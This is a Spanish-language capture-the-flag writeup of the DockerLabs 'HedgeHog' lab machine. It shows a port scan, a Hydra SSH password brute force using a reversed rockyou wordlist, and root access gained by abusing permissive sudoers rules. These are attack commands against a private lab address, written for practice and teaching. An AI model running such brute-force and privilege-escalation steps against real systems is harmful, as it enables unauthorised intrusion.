# 🎯 Writeup: DockerLabs - HedgeHog (Dificultad Fácil)

![Dificultad](https://img.shields.io/badge/Dificultad-Fácil-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux)
![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs-orange?style=for-the-badge)

## 📝 Introducción
En este writeup detallo el proceso de resolución de la máquina **HedgeHog** de la plataforma DockerLabs. La máquina presenta un nivel de dificultad fácil y pone a prueba habilidades básicas de enumeración web, optimización de diccionarios para ataques de fuerza bruta (SSH), y escalada de privilegios en múltiples fases (horizontal y vertical) abusando de permisos en el archivo `sudoers`.

---

## 🚀 Despliegue de la Máquina
Para comenzar, desplegamos la máquina utilizando el script proporcionado por DockerLabs.

```bash
sudo bash auto_deploy.sh hedgehog.tar
```
Una vez desplegada, la máquina obtiene la dirección IP `172.17.0.3`.

---

## 🔍 Reconocimiento (Reconnaissance)
El primer paso es realizar un escaneo de puertos y servicios para identificar la superficie de ataque.

```bash
nmap -sS -sV -sC -Pn -n -p- 172.17.0.3
```
Resultados del escaneo:
- **Puerto 22 (SSH):** `OpenSSH 9.6p1 Ubuntu 3ubuntu13.5`.
- **Puerto 80 (HTTP):** `Apache httpd 2.4.58` (Sin título configurado).

---

## 🕵️ Enumeración (Enumeration)

### 1. Enumeración Web
Al observar el puerto 80 abierto, realizamos una petición básica con `curl` para inspeccionar la página principal.

```bash
curl [http://172.17.0.3](http://172.17.0.3)
```
Resultado obtenido:
```text
tails
```
La respuesta del servidor consta únicamente de la palabra `tails`. En el contexto de un CTF, una palabra expuesta sin contexto suele ser un claro indicio de un posible **nombre de usuario válido** para el sistema.

### 2. Preparación del Diccionario
Para evitar tiempos de espera prolongados en el ataque de fuerza bruta, invertimos el diccionario clásico `rockyou.txt` usando `tac` y limpiamos espacios vacíos con `tr`. Esto nos permite probar las contraseñas alojadas al final de la lista de forma más rápida.

```bash
tac /usr/share/wordlists/rockyou.txt | tr -d ' ' > final.txt
```

---

## 💥 Explotación (Exploitation)
Lanzamos **Hydra** contra el servicio SSH utilizando el usuario descubierto (`tails`) y nuestro diccionario optimizado.

```bash
hydra -l tails -P final.txt ssh://172.17.0.3
```
Resultado obtenido:
```text
[22][ssh] host: 172.17.0.3   login: tails   password: 3117548331
```
Hydra encuentra la contraseña. Procedemos a conectarnos de forma legítima al servidor.

```bash
ssh tails@172.17.0.3
# Password: 3117548331
```
Una vez dentro de la máquina, obtenemos nuestro acceso inicial como el usuario `tails`.

---

## 👑 Escalada de Privilegios (Privilege Escalation)
La escalada de privilegios en esta máquina consta de dos fases abusando de configuraciones permisivas de `sudo`.

### 1. Escalada Horizontal (tails -> sonic)
Revisamos los permisos sudo asignados a nuestro usuario actual:

```bash
sudo -l
```
Salida del comando:
```text
User tails may run the following commands on e83f75860dce:
    (sonic) NOPASSWD: ALL
```
Podemos ejecutar cualquier comando como el usuario `sonic` sin proporcionar contraseña. Lanzamos una shell bash:

```bash
sudo -u sonic bash
```
*(Nota de auditoría: Dentro del directorio `/home/sonic/Documentos` encontramos un archivo llamado `contraseña` que contiene `perritos!`, sin embargo, seguimos revisando nuestros permisos sudo para escalar directamente a root).*

### 2. Escalada Vertical (sonic -> root)
Volvemos a verificar los privilegios de `sudo`, esta vez para nuestro nuevo usuario `sonic`:

```bash
sudo -l
```
Salida del comando:
```text
User sonic may run the following commands on e83f75860dce:
    (ALL) NOPASSWD: ALL
```
¡El usuario `sonic` tiene permisos absolutos para ejecutar comandos como `root`! Lanzamos nuestra shell definitiva:

```bash
sudo -u root bash
```
Verificamos nuestra identidad:
```bash
# whoami
root
```
¡Máquina comprometida con éxito! Obtenemos una shell interactiva como el usuario root.

---

## 📌 Conclusión
La máquina HedgeHog nos enseña la importancia de:
- **Prestar atención a fugas sutiles:** Palabras aisladas en la raíz web a menudo revelan usuarios válidos del sistema.
- **Manipulación de listas de palabras:** Invertir y formatear diccionarios gigantes (usando `tac` y `tr`) es vital para agilizar los ataques de fuerza bruta por SSH.
- **Auditar permisos Sudo:** Las políticas laxas en `sudoers` permiten movimientos laterales y escaladas verticales sucesivas que terminan en el compromiso total del sistema.

¡Happy Hacking! 🐧💻
